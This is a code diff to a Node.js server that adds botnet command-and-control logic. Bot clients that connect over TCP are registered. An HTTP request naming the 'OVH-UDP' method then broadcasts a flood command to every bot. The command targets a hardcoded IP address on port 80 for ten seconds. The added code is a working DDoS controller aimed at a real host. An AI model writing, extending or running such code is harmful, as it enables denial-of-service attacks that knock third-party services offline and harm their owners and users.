@@ -10,6 +10,20 @@ const HTTP_PORT = 3000
 const SOCKET_PORT = 7777
 const SOCKET_HOST = "0.0.0.0"
 
+/*************
+ *  METHODS  *
+ ************/
+
+const METHODS = ["OVH-UDP"]
+
+var clients = []
+
+const sendAttack = (method, host, port, time) => {
+    for (let client of clients) {
+        client.write(`ATT|${method}|${host}|${port}|${time}`)
+    }
+}
+
 console.log(
     chalk.italic(
         chalkGradient.fruit(
@@ -19,7 +33,14 @@ console.log(
 )
 
 app.get("/", (req, res) => {
-    res.send("Hello World!")
+    let { method } = req.query
+    if (!method) return res.status(404).send("method parameter not set")
+    method = method.toUpperCase()
+
+    if (!METHODS.includes(method))
+        return res.status(404).send("method does not exist")
+    sendAttack(method, "141.95.52.208", 80, 10)
+    return res.send(`sent!`)
 })
 
 var server = net.createServer(function (socket) {
@@ -31,11 +52,13 @@ var server = net.createServer(function (socket) {
                 )} disconnected.`
             )
         )
+        clients = clients.filter((client) => client !== socket)
     }
 
     socket.on("data", (data) => {
         console.log("Received: " + data)
-        if (data.toString() === "servConn") {
+        const dataStr = data.toString()
+        if (dataStr === "servConn") {
             console.log(
                 chalk.grey(
                     `[${chalk.greenBright("+")}] ${chalkGradient.rainbow(
@@ -43,6 +66,7 @@ var server = net.createServer(function (socket) {
                     )} connected.`
                 )
             )
+            clients.push(socket)
         }
     })
     socket.on("end", onLeave)
